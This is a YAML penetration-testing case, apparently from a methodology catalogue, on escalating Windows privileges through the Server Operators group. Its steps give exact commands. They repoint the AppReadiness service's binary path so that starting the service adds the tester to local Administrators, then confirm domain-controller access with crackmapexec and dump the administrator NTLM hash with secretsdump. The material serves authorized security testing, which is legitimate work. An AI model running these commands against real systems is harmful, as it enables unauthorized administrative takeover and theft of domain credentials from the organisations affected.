---
testcase: Privilege Escalation via Server Operators Group by Service Manipulation
platforms:
  - AD
  - Windows
methodology:
  - BlackBox
  - GreyBox
references:
  - https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
how-to-test: |
  1. Query the AppReadiness service:
     - `sc qc AppReadiness`
  2. Check service permissions:
     - `c:\Tools\PsService.exe security AppReadiness`
  3. View current Administrators group members:
     - `net localgroup Administrators`
  4. Change the service binary path to add your user to Administrators:
     - `sc config AppReadiness binPath= "cmd /c net localgroup Administrators <your_user> /add"`
  5. Start the service to trigger the payload:
     - `sc start AppReadiness`
  6. Confirm your user is now in the Administrators group:
     - `net localgroup Administrators`
  7. (Optional) Confirm local admin access on the Domain Controller:
     - `crackmapexec smb <DC_IP> -u <your_user> -p <your_password>`
  8. (Optional) Retrieve NTLM password hashes:
     - `secretsdump.py <your_user>@<DC_IP> -just-dc-user administrator`

Key Points:
  - Server Operators can manipulate services to escalate privileges.
  - Always restore the original service configuration after exploitation.
---